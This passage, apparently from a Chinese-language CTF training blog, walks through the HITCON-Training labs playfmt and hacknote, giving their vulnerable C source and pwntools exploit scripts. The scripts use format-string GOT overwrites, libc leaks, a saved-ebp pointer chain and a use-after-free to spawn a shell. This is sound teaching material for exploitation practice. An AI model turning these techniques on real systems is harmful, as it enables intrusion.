&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;You need be a phd&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样是格式化字符串漏洞，存在两种利用方法。一种是直接覆盖<code>magic</code>满足条件：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	io = process(binary)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line">	info = io.recvline()</span><br><span class="line">	io.close()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x804a038</span></span><br><span class="line">payload = fmtstr_payload(auto.offset,&#123;magic:<span class="number">0xda</span>&#125;)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>

<p>另一种是用<code>main</code>中的<code>read</code>开始的语句覆盖<code>puts</code>，然后用<code>system</code>覆盖<code>printf</code>来拿到shell。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">main_read = <span class="number">0x804859b</span></span><br><span class="line">payload = fmtstr_payload(auto.offset,&#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]:main_read,elf.got[<span class="string">&#x27;printf&#x27;</span>]:elf.plt[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,payload)</span><br><span class="line">sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9 - playfmt"></a>lab9 - playfmt</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>] ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_fmt</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">200</span>);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>,<span class="number">4</span>))</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">printf</span>(buf);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;  Magic echo Server&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;=====================&quot;</span>);</span><br><span class="line">	do_fmt();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	play();</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>本题依然是格式化字符串漏洞，但问题在于这次并不会将数据读入栈上，而是读入bss段。这使得常规fsb利用方式失效，但是我们依然可以通过修改<code>saved ebp</code>来达到任意地址读写。</p>
<p>在<code>printf</code>前查看栈情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xffffcd60 —▸ 0x804a060 (buf) ◂— &#39;aaaa\n&#39;</span><br><span class="line">01:0004│      0xffffcd64 —▸ 0x8048640 ◂— jno    0x80486b7 &#x2F;* &#39;quit&#39; *&#x2F;</span><br><span class="line">02:0008│      0xffffcd68 ◂— 0x4</span><br><span class="line">03:000c│      0xffffcd6c —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffcd70 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffcd74 —▸ 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">06:0018│ ebp  0xffffcd78 —▸ 0xffffcd88 —▸ 0xffffcd98 ◂— 0x0</span><br><span class="line">07:001c│      0xffffcd7c —▸ 0x8048584 (play+59) ◂— nop</span><br><span class="line">08:0020│      0xffffcd80 —▸ 0xf7fb6d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffcd84 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffcd88 —▸ 0xffffcd98 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffcd8c —▸ 0x80485b1 (main+42) ◂— nop</span><br><span class="line">0c:0030│      0xffffcd90 —▸ 0xf7fb63dc (__exit_funcs) —▸ 0xf7fb71e0 (initial) ◂— 0x0</span><br></pre></td></tr></table></figure>

<p>可以看到<code>saved ebp</code>在<code>6$</code>位置，它实际上指向位于<code>10$</code>的<code>0xffffcd88</code>。也就是说，如果我们能通过<code>%n</code>修改<code>saved ebp</code>，实际上就能修改<code>10$</code>的位置。</p>
<p>然而，<code>10$</code>这个位置同样可以是一个指针。同理我们也可以<code>%n</code>修改<code>10$</code>指向的地址。除了修改，我们同样可以泄露，那么自然想到泄露libc函数的GOT地址，再覆盖成system的做法。</p>
<p>因此思路如下，记栈上偏移为<code>10</code>的地址为<code>ebp2</code>，偏移为7和11的地址分别为<code>s7</code>和<code>s11</code>。</p>
<ol>
<li>通过<code>ebp</code>修改<code>ebp2</code>指向<code>s7</code></li>
<li>通过<code>ebp2</code>将<code>s7</code>覆盖为<code>printf@got</code></li>
<li>通过<code>ebp</code>修改<code>ebp2</code>指向<code>s11</code></li>
<li>通过<code>ebp2</code>将<code>s11</code>覆盖为<code>printf@got+2</code></li>
<li>通过<code>%7$s</code>泄露<code>s7</code>处的<code>printf@got</code>，从而泄露libc</li>
<li>用<code>system@plt</code>低2字节覆盖<code>s7</code>处的<code>printf@got</code></li>
<li>用<code>system@plt</code>高2字节覆盖<code>s11</code>处的<code>printf@got+2</code></li>
<li>输入<code>/bin/sh\x00</code>，调用<code>printf(&quot;/bin/sh&quot;)</code>即getshell</li>
</ol>
<p>当然也可以4字节直接写，但是由于字符数过多会导致速度非常慢，不推荐。此外，需要注意即使是2字节写依然会有延迟，需要多次<code>recv()</code>接收返回的字符串，直到发送的特殊字符串能够收到为止，算是fsb利用时的一个小技巧。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">hn = <span class="keyword">lambda</span> addr,offset: <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(addr,offset)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delay</span>():</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		sl(<span class="string">&#x27;delay&#x27;</span>)</span><br><span class="line">		sleep(<span class="number">0.2</span>)</span><br><span class="line">		data = r()</span><br><span class="line">		<span class="keyword">if</span> data.find(<span class="string">&#x27;delay&#x27;</span>) != <span class="number">-1</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">	ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">ebp2 = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">ebp = ebp2<span class="number">-0x10</span></span><br><span class="line">s7 = ebp2<span class="number">-0xc</span></span><br><span class="line">s11 = ebp2+<span class="number">4</span></span><br><span class="line">mask = <span class="number">0xffff</span></span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sl(hn(s7&amp;mask,<span class="number">6</span>))</span><br><span class="line">sl(hn(printf&amp;mask,<span class="number">10</span>))</span><br><span class="line">delay()</span><br><span class="line">sl(hn(s11&amp;mask,<span class="number">6</span>))</span><br><span class="line">sl(hn((printf+<span class="number">2</span>)&amp;mask,<span class="number">10</span>))</span><br><span class="line">delay()</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;aaaa%7$s&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">printf = u32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;printf&#x27;</span>,printf)</span><br><span class="line"></span><br><span class="line">sl(hn(system&amp;mask,<span class="number">7</span>)+hn((system&gt;&gt;<span class="number">16</span>)-(system&amp;mask),<span class="number">11</span>))</span><br><span class="line">delay()</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="lab10-hacknote"><a href="#lab10-hacknote" class="headerlink" title="lab10 - hacknote"></a>lab10 - hacknote</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*printnote)();</span><br><span class="line">	<span class="keyword">char</span> *content ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span> *<span class="title">notelist</span>[5];</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_note_content</span><span class="params">(struct note *<span class="keyword">this</span>)</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="keyword">this</span>-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_note</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i ;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span> size ;</span><br><span class="line">	<span class="keyword">if</span>(count &gt; <span class="number">5</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">5</span> ; i ++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(!notelist[i])&#123;</span><br><span class="line">			notelist[i] = (struct note*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct note));</span><br><span class="line">			<span class="keyword">if</span>(!notelist[i])&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			notelist[i]-&gt;printnote = print_note_content;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf,<span class="number">8</span>);</span><br><span class="line">			size = atoi(buf);</span><br><span class="line">			notelist[i]-&gt;content = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line">			<span class="keyword">if</span>(!notelist[i]-&gt;content)&#123;</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">			read(<span class="number">0</span>,notelist[i]-&gt;content,size);</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">			count++;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del_note</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= count)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">		<span class="built_in">free</span>(notelist[idx]-&gt;content);</span><br><span class="line">		<span class="built_in">free</span>(notelist[idx]);</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_note</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">int</span> idx ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">	idx = atoi(buf);</span><br><span class="line">	<span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt;= count)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">		_exit(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">		notelist[idx]-&gt;printnote(notelist[idx]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;       HackNote       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 1. Add note          &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 2. Delete note       &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 3. Print note        &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot; 4. Exit              &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;----------------------&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		menu();</span><br><span class="line">		read(<span class="number">0</span>,buf,<span class="number">4</span>);</span><br><span class="line">		<span class="keyword">switch</span>(atoi(buf))&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">				add_note();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">				del_note();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span> :</span><br><span class="line">				print_note();</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span> :</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line">			<span class="keyword">default</span> :</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>经典的uaf利用，做法和<a href="../ACTF2019Pwn/">ACTF2019-babyheap</a>以及<a href="../BJDCTF2019Pwn">BJDCTF2019-YDSneedGirlfriend</a>完全相同。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(elf.sym[<span class="string">&#x27;magic&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab11-bamboobox"><a href="#lab11-bamboobox" class="headerlink" title="lab11 - bamboobox"></a>lab11 - bamboobox</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> size ;</span><br><span class="line">	<span class="keyword">char</span> *name ;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span> <span class="title">itemlist</span>[100] =</span> &#123;<span 